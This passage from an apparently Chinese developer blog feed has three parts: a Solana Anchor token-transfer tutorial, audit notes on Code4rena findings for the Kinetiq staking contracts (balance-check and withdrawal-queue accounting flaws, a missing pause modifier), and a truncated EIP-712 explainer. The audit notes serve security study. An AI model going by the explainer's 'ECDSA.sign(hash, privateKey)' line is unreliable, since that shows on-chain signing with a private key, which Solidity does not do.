返回成功的结果</span></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义账户结构，包含与转账相关的账户信息</span></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TransferTokens</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// `signer` 是一个可变账户，表示发起转账操作的签名者</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,</span><br><span class="line">    </span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// `mint` 账户是代币的 Mint 账户，控制代币的创建和管理</span></span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// `sender_token_account` 是发送方的代币账户，存储发送者的代币</span></span><br><span class="line">    <span class="keyword">pub</span> sender_token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// `recipient_token_account` 是接收方的代币账户，存储接收者的代币</span></span><br><span class="line">    <span class="keyword">pub</span> recipient_token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;, <span class="comment">// Token Program，用于代币操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过CPI使用PDA代币所有者转移代币"><a href="#通过CPI使用PDA代币所有者转移代币" class="headerlink" title="通过CPI使用PDA代币所有者转移代币"></a>通过CPI使用PDA代币所有者转移代币</h3><p>通过程序控制的 PDA 地址来充当代币账户的所有者，而程序通过 CPI 调用代币程序（Token Program）进行代币转移操作。</p><p>结合之前讲的Mint账户，铸造代币的内容，来实现通过CPI使用PDA代币所有者转移代币</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> anchor_lang::prelude::*;  <span class="comment">// 引入 Anchor 的预定义模块，用于开发程序的基础功能。</span></span><br><span class="line"><span class="keyword">use</span> anchor_spl::&#123;</span><br><span class="line">    associated_token::AssociatedToken,  <span class="comment">// 引入 Anchor SPL 中的 Associated Token 模块，处理与 Token 账户相关的操作。</span></span><br><span class="line">    token_interface::&#123;<span class="keyword">self</span>, Mint, MintTo, TokenAccount, TokenInterface, TransferChecked&#125;,  <span class="comment">// 引入 Token 接口相关功能。</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">declare_id!(<span class="string">&quot;3pX5NKLru1UBDVckynWQxsgnJeUN3N1viy36Gk9TSn8d&quot;</span>);  <span class="comment">// 定义智能合约的 ID（这个 ID 是一个唯一标识符）。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[program]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> token_example &#123;  <span class="comment">// 定义程序的模块，程序的名称为 token_example。</span></span><br><span class="line">    <span class="keyword">use</span> super::*;  <span class="comment">// 引入外部代码（当前模块）的所有功能。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建和铸造代币的功能</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">create_and_mint_tokens</span>(ctx: Context&lt;CreateAndMintTokens&gt;, amount: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">        <span class="comment">// 创建铸造的种子数据，用于通过 PDA 进行签名。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">signer_seeds</span>: &amp;[&amp;[&amp;[<span class="type">u8</span>]]] = &amp;[&amp;[<span class="string">b&quot;mint&quot;</span>, &amp;[ctx.bumps.mint]]];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 MintTo CPI 调用，表示铸造代币操作。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_accounts</span> = MintTo &#123;</span><br><span class="line">            mint: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 获取 mint 账户信息。</span></span><br><span class="line">            to: ctx.accounts.token_account.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 获取代币账户信息，代币会铸造到此账户。</span></span><br><span class="line">            authority: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// mint 的 authority 账户。</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_program</span> = ctx.accounts.token_program.<span class="title function_ invoke__">to_account_info</span>();  <span class="comment">// 获取 token 程序的账户信息。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_context</span> = CpiContext::<span class="title function_ invoke__">new</span>(cpi_program, cpi_accounts).<span class="title function_ invoke__">with_signer</span>(signer_seeds);  <span class="comment">// 创建 CPI 上下文并设置 signer。</span></span><br><span class="line"></span><br><span class="line">        token_interface::<span class="title function_ invoke__">mint_to</span>(cpi_context, amount)?;  <span class="comment">// 调用 mint_to 函数，铸造 `amount` 数量的代币。</span></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())  <span class="comment">// 返回成功。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转账代币的功能</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">transfer_tokens</span>(ctx: Context&lt;TransferTokens&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">        <span class="comment">// 创建转账的种子数据，用于通过 PDA 进行签名。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">signer_seeds</span>: &amp;[&amp;[&amp;[<span class="type">u8</span>]]] = &amp;[&amp;[<span class="string">b&quot;token&quot;</span>, &amp;[ctx.bumps.sender_token_account]]];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取待转账的数量。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">amount</span> = ctx.accounts.sender_token_account.amount;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">decimals</span> = ctx.accounts.mint.decimals;  <span class="comment">// 获取代币的 decimals。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TransferChecked CPI 调用，表示代币转账操作。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_accounts</span> = TransferChecked &#123;</span><br><span class="line">            mint: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 获取 mint 账户信息。</span></span><br><span class="line">            from: ctx.accounts.sender_token_account.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 获取发送方 token 账户信息。</span></span><br><span class="line">            to: ctx.accounts.recipient_token_account.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 获取接收方 token 账户信息。</span></span><br><span class="line">            authority: ctx.accounts.sender_token_account.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 获取发送方账户作为授权者。</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_program</span> = ctx.accounts.token_program.<span class="title function_ invoke__">to_account_info</span>();  <span class="comment">// 获取 token 程序的账户信息。</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_context</span> = CpiContext::<span class="title function_ invoke__">new</span>(cpi_program, cpi_accounts).<span class="title function_ invoke__">with_signer</span>(signer_seeds);  <span class="comment">// 创建 CPI 上下文并设置 signer。</span></span><br><span class="line"></span><br><span class="line">        token_interface::<span class="title function_ invoke__">transfer_checked</span>(cpi_context, amount, decimals)?;  <span class="comment">// 调用 transfer_checked 函数执行转账。</span></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())  <span class="comment">// 返回成功。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateAndMintTokens</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// 发送方账户，用于支付账户创建费用和铸造代币的授权。</span></span><br><span class="line">    <span class="meta">#[account(</span></span><br><span class="line"><span class="meta">        init,</span></span><br><span class="line"><span class="meta">        payer = signer,</span></span><br><span class="line"><span class="meta">        mint::decimals = 6,  // 设置代币的小数位数。</span></span><br><span class="line"><span class="meta">        mint::authority = mint,  // 设置 mint 的权限。</span></span><br><span class="line"><span class="meta">        mint::freeze_authority = mint,  // 设置冻结权限。</span></span><br><span class="line"><span class="meta">        seeds = [b<span class="string">&quot;mint&quot;</span>]</span>,  <span class="comment">// 使用种子 [b&quot;mint&quot;] 来生成 PDA。</span></span><br><span class="line">        bump  <span class="comment">// 使用 bump 来确保生成的 PDA 地址唯一。</span></span><br><span class="line">    )]</span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// 创建并初始化一个 mint 账户。</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">#[account(</span></span><br><span class="line"><span class="meta">        init,</span></span><br><span class="line"><span class="meta">        payer = signer,</span></span><br><span class="line"><span class="meta">        token::mint = mint,  // 关联创建的 mint 账户。</span></span><br><span class="line"><span class="meta">        token::authority = token_account,  // 设置 token_account 为 token 账户的权限。</span></span><br><span class="line"><span class="meta">        seeds = [b<span class="string">&quot;token&quot;</span>]</span>,  <span class="comment">// 使用种子 [b&quot;token&quot;] 来生成 PDA。</span></span><br><span class="line">        bump  <span class="comment">// 使用 bump 来确保生成的 PDA 地址唯一。</span></span><br><span class="line">    )]</span><br><span class="line">    <span class="keyword">pub</span> token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 创建并初始化一个 token 账户，用于接收铸造的代币。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// token 程序的接口。</span></span><br><span class="line">    <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;,  <span class="comment">// 系统程序的接口，用于账户初始化等操作。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TransferTokens</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// 发送方账户，用于授权代币转移。</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">#[account(</span></span><br><span class="line"><span class="meta">        mut,</span></span><br><span class="line"><span class="meta">        seeds = [b<span class="string">&quot;mint&quot;</span>]</span>,  <span class="comment">// 使用种子 [b&quot;mint&quot;] 来生成 mint 账户的 PDA。</span></span><br><span class="line">        bump  <span class="comment">// 使用 bump 来确保生成的 PDA 地址唯一。</span></span><br><span class="line">    )]</span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// mint 账户，代表发行的代币。</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(</span></span><br><span class="line"><span class="meta">        mut,</span></span><br><span class="line"><span class="meta">        token::mint = mint,  // 关联 mint 账户。</span></span><br><span class="line"><span class="meta">        token::authority = sender_token_account,  // 设置 sender_token_account 为 token 账户的权限。</span></span><br><span class="line"><span class="meta">        seeds = [b<span class="string">&quot;token&quot;</span>]</span>,  <span class="comment">// 使用种子 [b&quot;token&quot;] 来生成 PDA。</span></span><br><span class="line">        bump  <span class="comment">// 使用 bump 来确保生成的 PDA 地址唯一。</span></span><br><span class="line">    )]</span><br><span class="line">    <span class="keyword">pub</span> sender_token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 发送方的 token 账户。</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(</span></span><br><span class="line"><span class="meta">        init_if_needed,  // 如果接收方账户尚未存在，则进行初始化。</span></span><br><span class="line"><span class="meta">        payer = signer,  // 使用 signer 账户支付创建费用。</span></span><br><span class="line"><span class="meta">        associated_token::mint = mint,  // 关联 mint 账户。</span></span><br><span class="line"><span class="meta">        associated_token::authority = signer,  // 设置 signer 为接收方账户的权限。</span></span><br><span class="line"><span class="meta">        associated_token::token_program = token_program,  // 设置 token 程序。</span></span><br><span class="line"><span class="meta">    )]</span></span><br><span class="line">    <span class="keyword">pub</span> recipient_token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 接收方的 token 账户。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// token 程序的接口。</span></span><br><span class="line">    <span class="keyword">pub</span> associated_token_program: Program&lt;<span class="symbol">&#x27;info</span>, AssociatedToken&gt;,  <span class="comment">// 关联 token 程序接口，用于关联 token 账户。</span></span><br><span class="line">    <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;,  <span class="comment">// 系统程序接口，用于账户初始化等操作。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是一个创建Mint账户，Token账户，实现铸造代币，转移代币的过程。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Solana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>code4rena-Kinetiq</title>
      <link href="/2025/05/04/code4rena-Kinetiq/"/>
      <url>/2025/05/04/code4rena-Kinetiq/</url>
      
        <content type="html"><![CDATA[<h1 id="高-缓冲区达到最大限额，取消资金大于合约的资金"><a href="#高-缓冲区达到最大限额，取消资金大于合约的资金" class="headerlink" title="高  缓冲区达到最大限额，取消资金大于合约的资金"></a>高  缓冲区达到最大限额，取消资金大于合约的资金</h1><p>质押协议允许用户质押代币并赚取奖励。当用户希望提取他们的代币时，他们会调用 <code>queueWithdrawal()</code> 来启动提取流程。管理者可以通过调用 <code>cancelWithdrawal()</code> 来取消待处理的提取请求，这会将 KHYPE 代币返还给用户。为了正确完成取消流程，管理者必须调用 <code>redelegateWithdrawnHYPE()</code> 来更新协议状态，包括缓冲区和其他操作。<br>然而，存在一个限制：一旦达到缓冲区阈值，代币会从 EVM 层移动到 L1 spot 余额，但<code>redelegateWithdrawnHYPE()</code>要求<code> address(this).balance &gt;= cancelledWithdrawalAmount</code>。由于这些转移的资产在合约层面不再可访问，但仍然计入已取消的提取金额中，因此该条件在数学上变得不可能满足。尽管有概念验证（POC），但让我举个例子：<br>质押管理器合约的目标缓冲区为 3 HYPE。Alice、Bob、Sage 和 Tony 各质押了 1 HYPE，这自动达到了目标缓冲区，剩余部分将进入 L1 spot 余额。从这一点可以看出，余额不再是 4 HYPE，而是在调用 <code>_distributeStake()</code> 中的以下代码后大约为 3 HYPE：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success,) = payable(L1_HYPE_CONTRACT).call&#123;value: amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>随后，Alice、Bob、Sage 和 Tony 都发起了提取请求。管理者看到后调用了这 4 个待处理提取请求的<code> cancelWithdrawal()</code>，根据 hypeAmount，取消金额为 4 HYPE。在通过重新委托完成状态更新时，管理者调用了 <code>redelegateWithdrawnHYPE()</code>。由于 <code>address(this).balance &gt;= cancelledWithdrawalAmount，</code>这将回滚。为什么呢？因为 cancelAmount 是 4 HYPE，而质押合约的 HYPE 余额只有 3 HYPE，因为其余部分已经发送到了 L1 合约。</p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>已取消的资产无法重新委托，这将影响整个协议的会计核算。<br>缓冲区管理崩溃。</p><h1 id="高-质押函数没有限制谁调用"><a href="#高-质押函数没有限制谁调用" class="headerlink" title="高  质押函数没有限制谁调用"></a>高  质押函数没有限制谁调用</h1><p>只要向<code>StakingManger</code>发送HYPE（使用call,transfer）都会立即触发receive的函数进行质押</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    // 直接调用质押函数</span><br><span class="line">    stake();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="中-撤回函数中缺少暂停修饰符"><a href="#中-撤回函数中缺少暂停修饰符" class="headerlink" title="中 撤回函数中缺少暂停修饰符"></a>中 撤回函数中缺少暂停修饰符</h1><p><code>StakingManager::confirmWithdrawal()</code> 函数未包含 <code>whenWithdrawalNotPaused 修饰符</code>，尽管该函数明确属于“提现操作”。而根据 pauseWithdrawal() 函数的 Natspec 文档说明，其用途是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @notice 暂停所有提现操作</span><br><span class="line"> */</span><br><span class="line">function pauseWithdrawal() external onlyRole(MANAGER_ROLE) &#123;</span><br><span class="line">    withdrawalPaused = true;</span><br><span class="line">    emit WithdrawalPaused(msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当前 <code>confirmWithdrawal</code> 函数定义如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function confirmWithdrawal(uint256 withdrawalId) external nonReentrant whenNotPaused &#123;</span><br><span class="line">    uint256 amount = _processConfirmation(msg.sender, withdrawalId);</span><br><span class="line">    require(amount &gt; 0, &quot;No valid withdrawal request&quot;);</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>✅ 问题在于：缺少 <code>whenWithdrawalNotPaused</code> 修饰符，导致即使在协议执行 <code>pauseWithdrawal()</code> 后，用户依然可以继续执行提现确认。<br>这与“暂停提现”在设计上的初衷相悖 —— 按照预期，当协议暂停提现时，所有提现相关流程都应停止，以应对协议风险、紧急状态或攻击场景。</p><h1 id="中-取消提款时，没有更新另一个排队"><a href="#中-取消提款时，没有更新另一个排队" class="headerlink" title="中 取消提款时，没有更新另一个排队"></a>中 取消提款时，没有更新另一个排队</h1><p>存在漏洞<code>StakingManager</code> 合约，如果提款在 L1 上仍处于等待处理状态时被取消。这引入了一种可能性，即用户可以为同一质押触发多个 L1 提款作，可能会提取比最初存入的更多的 HYPE 并破坏协议会计。</p><p>详细说明<br>当用户将提款排队时，<code>StakingManager</code> 会对 L1作进行排队，以从验证者那里提取 HYPE。至关重要的是，如果稍后在调用 <code>processL1Withdrawals</code> 之前取消了此提款，则提款请求将在 L2（StakingManager） 上删除，但相应的 L1 取消委托给 staker 的作仍保留在队列中。这可能导致 L2 状态和 L1 状态之间不同步。</p><p>为了了解如何作，我们来检查<code> cancelWithdrawal</code> 函数中的相关代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function cancelWithdrawal(address user, uint256 withdrawalId) external onlyRole(MANAGER_ROLE) whenNotPaused &#123;</span><br><span class="line">    WithdrawalRequest storage request = _withdrawalRequests[user][withdrawalId];</span><br><span class="line">    require(request.hypeAmount &gt; 0, &quot;No such withdrawal request&quot;);</span><br><span class="line"></span><br><span class="line">    uint256 hypeAmount = request.hypeAmount;</span><br><span class="line">    uint256 kHYPEAmount = request.kHYPEAmount;</span><br><span class="line">    uint256 kHYPEFee = request.kHYPEFee;</span><br><span class="line"></span><br><span class="line">    // Clear the withdrawal request</span><br><span class="line">    delete _withdrawalRequests[user][withdrawalId];</span><br><span class="line">    totalQueuedWithdrawals -= hypeAmount;</span><br><span class="line"></span><br><span class="line">    // Return kHYPE tokens to user (including fees)</span><br><span class="line">    kHYPE.transfer(user, kHYPEAmount + kHYPEFee);</span><br><span class="line"></span><br><span class="line">    // Track cancelled amount for future redelegation</span><br><span class="line">    _cancelledWithdrawalAmount += hypeAmount;</span><br><span class="line"></span><br><span class="line">    emit WithdrawalCancelled(user, withdrawalId, hypeAmount, _cancelledWithdrawalAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，此函数仅通过删除提现请求并将 kHYPE 代币返回给用户来更新 L2 状态。但是，它没有一种机制来知道 undelegate 请求是否仍处于排队状态。</p><p>因此，当作员稍后使用<code>processL1Operations</code>处理 L1作队列时，将执行所有作，包括来自已取消提款的作。</p><p>然后，可以按如下方式演示此漏洞：</p><p>用户质押 1 ETH，获得 1 kHYPE。<br>用户排队退出（L1 Undelegate 命令 #1 已添加到队列）。<br>提款由于某种原因被经理取消（但 L1 命令 #1 仍在队列中），但重要的是，在所有待处理的提款（包括已取消的提款）通过 processL1Withdrawals 处理之前。<br>用户立即使用他从取消中获得的相同 kHYPE 将另一次提款排队（L1 命令 #2 添加到队列中）。<br>命令 #1 和命令 #2 最终都通过调用 processL1Operations 进行处理。<br>结果：当只有 1 个 ETH 被质押时，2 个 ETH 从验证者那里提取，造成了会计不一致。<br>建议的缓解步骤<br>一种可能的缓解措施是从 <code>_pendingWithdrawals </code>数组中删除已取消的提款取消委派（如果存在），从而将其从处理中删除。</p><h1 id="中-排队处理优先级不正确"><a href="#中-排队处理优先级不正确" class="headerlink" title="中 排队处理优先级不正确"></a>中 排队处理优先级不正确</h1><p>在同一笔交易中，既有提款又有存款</p><h1 id="中-余额检查不正确"><a href="#中-余额检查不正确" class="headerlink" title="中 余额检查不正确"></a>中 余额检查不正确</h1><p>资金已经不在合约里了，那么在去使用address（this）检查余额会发生错误</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>资金的多层转移，一定要看使用的检查条件是否合理 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EIP712</title>
      <link href="/2025/05/01/EIP712/"/>
      <url>/2025/05/01/EIP712/</url>
      
        <content type="html"><![CDATA[<h1 id="EIP712"><a href="#EIP712" class="headerlink" title="EIP712"></a>EIP712</h1><p>当然！EIP-712 是以太坊的一项标准，它定义了一个结构化的消息签名方案，以便能够<strong>安全、标准化</strong>地对复杂数据进行签名和验证。简单来说，它是一个用于<strong>签名复杂数据结构</strong>（如结构化对象、数组、嵌套对象等）并保证其不可篡改的标准。</p><h3 id="🌟-EIP-712-概述"><a href="#🌟-EIP-712-概述" class="headerlink" title="🌟 EIP-712 概述"></a>🌟 <strong>EIP-712 概述</strong></h3><p>EIP-712 规范提出了对<strong>结构化数据</strong>进行签名的方法，解决了以下问题：</p><ol><li><strong>避免重放攻击</strong>：如果没有结构化数据的签名，可能存在相同的签名被滥用的风险。</li><li><strong>易于解析和验证</strong>：签名的对象可以被预先约定和验证，避免直接签名原始字节流。</li><li><strong>提升用户体验</strong>：用户可以明确知道自己签署的内容，减少误签和恶意签名的风险。</li></ol><h3 id="🔍-EIP-712-的核心概念"><a href="#🔍-EIP-712-的核心概念" class="headerlink" title="🔍 EIP-712 的核心概念"></a>🔍 <strong>EIP-712 的核心概念</strong></h3><p>EIP-712 通过将数据分为两部分来创建安全的签名：</p><ol><li><p><strong>Domain Separator（域分隔符）</strong>：标识签名数据的来源。通过引入这个“域”概念，可以区分不同的签名场景，防止重放攻击。例如，一个签名用于交易，另一个用于账户管理，它们的域分隔符是不同的，彼此之间互不干扰。</p></li><li><p><strong>类型哈希</strong>：对数据结构的类型进行哈希，确保签名的数据结构不被篡改。</p></li><li><p><strong>数据结构</strong>：EIP-712 签名的数据本身是结构化的，数据包括了 <code>type</code>、<code>value</code>、<code>domain</code>（域）等信息，所有内容都有严格的格式。</p></li></ol><h3 id="📜-EIP-712-的使用过程"><a href="#📜-EIP-712-的使用过程" class="headerlink" title="📜 EIP-712 的使用过程"></a>📜 <strong>EIP-712 的使用过程</strong></h3><h4 id="1-定义结构化数据"><a href="#1-定义结构化数据" class="headerlink" title="1. 定义结构化数据"></a>1. <strong>定义结构化数据</strong></h4><p>EIP-712 要求签名的数据必须是结构化的（如 <code>struct</code> 或 JSON 对象）。举个例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Order &#123;</span><br><span class="line">    address userWallet;</span><br><span class="line">    uint256 amount;</span><br><span class="line">    uint256 nonce;</span><br><span class="line">    uint256 expiry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-计算域分隔符"><a href="#2-计算域分隔符" class="headerlink" title="2. 计算域分隔符"></a>2. <strong>计算域分隔符</strong></h4><p><strong>域分隔符（Domain Separator）</strong>通常包含以下信息：</p><ul><li>合约地址（或域名）</li><li>合约版本</li><li>合约链 ID</li><li>其他一些身份标识信息</li></ul><p>通过域分隔符可以确保签名只适用于特定的域，而不会被重放到其他地方。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(</span><br><span class="line">    keccak256(&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;),</span><br><span class="line">    keccak256(&quot;MyDapp&quot;),</span><br><span class="line">    keccak256(&quot;1&quot;),</span><br><span class="line">    block.chainid,</span><br><span class="line">    address(this)</span><br><span class="line">));</span><br></pre></td></tr></table></figure><h4 id="3-计算类型哈希"><a href="#3-计算类型哈希" class="headerlink" title="3. 计算类型哈希"></a>3. <strong>计算类型哈希</strong></h4><p>每种类型的结构数据都有一个对应的类型哈希（Type Hash），它是通过 <code>keccak256</code> 对结构的声明进行哈希计算得出的。比如，对于 <code>Order</code> 结构：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 ORDER_TYPEHASH = keccak256(</span><br><span class="line">    &quot;Order(address userWallet,uint256 amount,uint256 nonce,uint256 expiry)&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="4-组合哈希"><a href="#4-组合哈希" class="headerlink" title="4. 组合哈希"></a>4. <strong>组合哈希</strong></h4><p>组合域分隔符、类型哈希和数据本身，计算出最终的消息哈希：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 dataHash = keccak256(abi.encode(</span><br><span class="line">    ORDER_TYPEHASH,</span><br><span class="line">    order.userWallet,</span><br><span class="line">    order.amount,</span><br><span class="line">    order.nonce,</span><br><span class="line">    order.expiry</span><br><span class="line">));</span><br><span class="line">bytes32 hash = toTypedDataHash(DOMAIN_SEPARATOR, dataHash);</span><br></pre></td></tr></table></figure><p>这个哈希值就是签名所需的数据。</p><h4 id="5-签名"><a href="#5-签名" class="headerlink" title="5. 签名"></a>5. <strong>签名</strong></h4><p>使用 <code>ECDSA</code>（椭圆曲线数字签名算法）对上述生成的消息哈希进行签名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory signature = ECDSA.sign(hash, privateKey);</span><br></pre></td></tr></table></figure><p>签名完成后，消息和签名可以被发送到智能合约进行验证。</p><h4 id="6-验证签名"><a href="#6-验证签名" class="headerlink" title="6. 验证签名"></a>6. <strong>验证签名</strong></h4><p>在合约中，接收到数据和签名后，使用 <code>ECDSA.recover</code> 恢复签名者地址，并验证是否与期望的地址一致：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address signer = ECDSA.recover(hash, signature);</span><br><span class="line">require(signer == expectedSigner, &quot;Invalid signature&quot;);</span><br></pre></td></tr></table></figure><hr><h3 id="🧑‍💻-EIP-712-例子："><a href="#🧑‍💻-EIP-712-例子：" class="headerlink" title="🧑‍💻 EIP-712 例子："></a>🧑‍💻 <strong>EIP-712 例子：</strong></h3><p>假设你要在智能合约中实现订单系统，订单结构为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Order &#123;</span><br><span class="line">    address user;</span><br><span class="line">    uint256 amount;</span><br><span class="line">    uint256 nonce;</span><br><span class="line">    uint256 expiry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你可以按以下步骤使用 EIP-712 来签名和验证该订单：</p><ol><li><strong>定义数据结构和类型哈希：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 private constant ORDER_TYPEHASH = keccak256(</span><br><span class="line">    &quot;Order(address user,uint256 amount,uint256 nonce,uint256 expiry)&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>计算域分隔符：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(</span><br><span class="line">    keccak256(&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;),</span><br><span class="line">    keccak256(&quot;MyDapp&quot;),</span><br><span class="line">    keccak256(&quot;1&quot;),</span><br><span class="line">    block.chainid,</span><br><span class="line">    address(this)</span><br><span class="line">));</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>生成订单数据哈希：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 orderHash = keccak256(abi.encode(</span><br><span class="line">    ORDER_TYPEHASH,</span><br><span class="line">    order.user,</span><br><span class="line">    order.amount,</span><br><span class="line">    order.nonce,</span><br><span class="line">    